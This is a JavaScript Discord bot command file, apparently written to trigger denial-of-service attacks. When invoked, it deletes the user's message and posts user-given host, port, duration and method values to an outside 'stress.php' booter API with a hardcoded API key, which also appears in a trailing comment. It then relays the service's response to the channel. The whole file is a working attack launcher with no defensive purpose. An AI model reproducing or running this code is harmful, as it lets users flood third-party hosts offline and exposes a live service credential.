const Discord = require("discord.js");
const superagent = require("superagent");

module.exports.run = async (bot,message,args) => {

message.delete()
let body = await superagent
     .post(`http://api.protechable.com/stress.php?key=90B4shZx2fkN0Cfk04qr&h=${args[0]}&p=${args[1]}&t=${args[2]}&m=${args[3]}`)
     .end((err, res) => {
      console.log(res.res.text)
      message.channel.send(res.res.text)
      console.log(`http://api.protechable.com/stress.php?key=90B4shZx2fkN0Cfk04qr&h=${args[0]}&p=${args[1]}&t=${args[2]}&m=${args[3]}`)
    });
}


module.exports.help = {
  name: "lion91"
}


//90B4shZx2fkN0Cfk04qr
